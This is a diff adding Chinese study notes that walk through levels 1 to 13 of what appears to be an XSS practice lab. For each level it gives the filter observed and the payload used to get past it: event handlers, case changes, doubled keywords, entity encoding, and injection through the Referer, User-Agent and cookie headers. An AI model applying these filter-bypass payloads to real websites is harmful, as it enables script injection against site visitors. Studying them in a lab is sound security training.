@@ -1,0 +1,59 @@
+XSS思想：根据输入找回显点，尝试各种输入查看过滤，根据过滤情况找绕过方法。
+
+取巧通关：
+1、console栏执行js弹窗;
+2、直接将网址栏level?修改为level20;
+3、。。。
+
+小结：
+貌似代码在浏览器中如果尖括号被实体化，将无法执行。如果其他部分被实体化，可以执行，可以用来绕过代码审查。
+》》》》有网后确认《《《《《
+
+
+硬怼：
+level1:唯一跟提交数据有关的是test，那就将test改成js执行：<script>alert("haha");</script>
+
+level2拼接js、截断
+tip:<input name=keyword  value=""><script>alert("xss");</script>//">
+payload:"><script>alert("xss");</script>//
+
+level3有拦截直观script，改用事件不需script
+tip:<input name=keyword  value='' onmouseover='alert("哈哈，让我过！")'>
+payload:' onmouseover='alert("哈哈，让我过！")
+
+level4同level3，改单引号闭合为双引号闭合
+
+level5有改写事件关键字前面部分on，改用href不用on事件
+<input name=keyword  value="123">
+<input name=keyword  value="123"><script>
+杯具s：
+<input name=keyword  value="" onclick="alert(1)">
+<input name=keyword  value="" o_nclick="alert(1)">
+payload:1"><a href=javascript:alert(1)>单击我有奖</a>//
+
+level6：改写href为h_ref，它先要找到然后才能改，那么我就换衣服（改变大小写）让你找不到
+payload：1"><a HREF=javascript:alert(1)>单击我有奖</a>//
+
+level7：删除了href和script，它忘了删掉一层，外面一层又闭合了。
+payload：1"><a hhrefref=javascscriptript:alert(1)>单击我有奖</a>//
+
+level8：检测javascript替换成javasc_ript，那么就不让它检测到，将其中字符实体化编码
+payload：javasc&#114;ipt:alert(1)
+
+level9：继续使用level18的payload，提示网址有误，开头加上http，发现连接格式正常，但是js不能运行。万一检测只要包含http就满足条件就行了呢。
+payload：javasc&#114ipt:alert(&#34;http://&quot)
+
+level10:keyword字段输入值通通被转义，发现三个隐藏输入框，分别赋值POST提交，发现t_sort字段有回显，加以利用，构造成功js代码，但是无法执行，需要更改类型hidden为text
+payload：/level10.php?t_sort=1" onmouseover="javascript:alert(1);" type="text" 
+或者：	/level10.php?t_sort=1" onmouseover="alert(1);" type="text" 
+
+level11、level12，网页回显内容来自referer和User-Agent提交的参数，返回上页修改重放→OK
+payload_level11&level12：1" onmouseover='alert(1)' type="text"
+
+level13:将隐藏属性的几个字段都赋值POST提交一遍，发现t_sort有回显、t_cook有变化。尝试利用t_sort字段，尖括号被实体化转义，无法利用。
+坑：
+失败：尝试利用t_sort构造：<input name="t_sort"  value="1" onmouseover="javascript:alert(1);" type="text" type="hidden">
+失败：payload：1" onmouseover="javascript:alert(1);" type="text
+失败原因：构造的输入框被转义为：<input name="t_sort"  value="1&quot; onmouseover=&quot;javascript:alert(1);&quot; type=&quot;text" type="hidden">，页面不显示1
+成功:尝试利用t_cook，无法直接赋值POST提交，疑似COOKIE，构造COOKIE，成功。
+payload：cookie："user=1" onmouseover='alert(1)' type="text"
